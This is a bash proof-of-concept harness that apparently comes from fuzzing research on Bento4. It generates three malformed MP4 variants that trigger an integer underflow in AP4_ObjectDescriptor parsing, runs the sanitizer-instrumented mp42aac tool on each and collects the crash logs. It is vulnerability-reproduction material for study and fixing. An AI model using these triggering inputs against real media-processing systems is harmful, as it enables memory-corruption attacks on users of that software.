#!/usr/bin/env bash
set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Command_h"
GEN="$POC_DIR/vuln_001_gen.py"
MP4="$POC_DIR/vuln_001.mp4"
RESULT="$POC_DIR/vuln_001_result.txt"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
ASAN_LOG_PREFIX="$POC_DIR/asan.log"

# Clear previous results
rm -f "$RESULT" "${ASAN_LOG_PREFIX}".*

echo "=== VULN 001 PoC: AP4_ObjectDescriptor integer underflow ===" | tee "$RESULT"
echo "Date: $(date)" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# ────────────────────────────────────────────────────────────────
# Variant 1: OD tag=0x01, payload_size=0  (underflow: 0-2=0xFFFFFFFE)
# ────────────────────────────────────────────────────────────────
echo "[*] Variant 1: Generating MP4 (OD tag=0x01, payload_size=0)..." | tee -a "$RESULT"
python3 "$GEN" 1 2>&1 | tee -a "$RESULT"

echo "[*] Running mp42aac (variant 1)..." | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
  "$BINARY" "$MP4" /dev/null \
  >> "$RESULT" 2>&1 || true

echo "" | tee -a "$RESULT"
echo "[*] Collecting ASAN/UBSAN log output (variant 1)..." | tee -a "$RESULT"
for f in "${ASAN_LOG_PREFIX}".*; do
    [ -f "$f" ] || continue
    echo "--- $f ---" | tee -a "$RESULT"
    cat "$f" | tee -a "$RESULT"
done

# ────────────────────────────────────────────────────────────────
# Variant 2: OD tag=0x01, payload_size=1  (underflow: 1-2=0xFFFFFFFF)
# ────────────────────────────────────────────────────────────────
echo "" | tee -a "$RESULT"
echo "[*] Variant 2: Generating MP4 (OD tag=0x01, payload_size=1)..." | tee -a "$RESULT"
python3 "$GEN" 2 2>&1 | tee -a "$RESULT"

echo "[*] Running mp42aac (variant 2)..." | tee -a "$RESULT"
rm -f "${ASAN_LOG_PREFIX}".*
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
  "$BINARY" "$MP4" /dev/null \
  >> "$RESULT" 2>&1 || true

echo "[*] Collecting ASAN/UBSAN log output (variant 2)..." | tee -a "$RESULT"
for f in "${ASAN_LOG_PREFIX}".*; do
    [ -f "$f" ] || continue
    echo "--- $f ---" | tee -a "$RESULT"
    cat "$f" | tee -a "$RESULT"
done

# ────────────────────────────────────────────────────────────────
# Variant 3: MP4_OD tag=0x11, payload_size=0  (underflow: 0-2=0xFFFFFFFE)
# ────────────────────────────────────────────────────────────────
echo "" | tee -a "$RESULT"
echo "[*] Variant 3: Generating MP4 (MP4_OD tag=0x11, payload_size=0)..." | tee -a "$RESULT"
python3 "$GEN" 3 2>&1 | tee -a "$RESULT"

echo "[*] Running mp42aac (variant 3)..." | tee -a "$RESULT"
rm -f "${ASAN_LOG_PREFIX}".*
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
  "$BINARY" "$MP4" /dev/null \
  >> "$RESULT" 2>&1 || true

echo "[*] Collecting ASAN/UBSAN log output (variant 3)..." | tee -a "$RESULT"
for f in "${ASAN_LOG_PREFIX}".*; do
    [ -f "$f" ] || continue
    echo "--- $f ---" | tee -a "$RESULT"
    cat "$f" | tee -a "$RESULT"
done

# ────────────────────────────────────────────────────────────────
# Regenerate variant 1 as the canonical vuln_001.mp4
# ────────────────────────────────────────────────────────────────
python3 "$GEN" 1 > /dev/null 2>&1 || true

echo "" | tee -a "$RESULT"
echo "[*] Done." | tee -a "$RESULT"
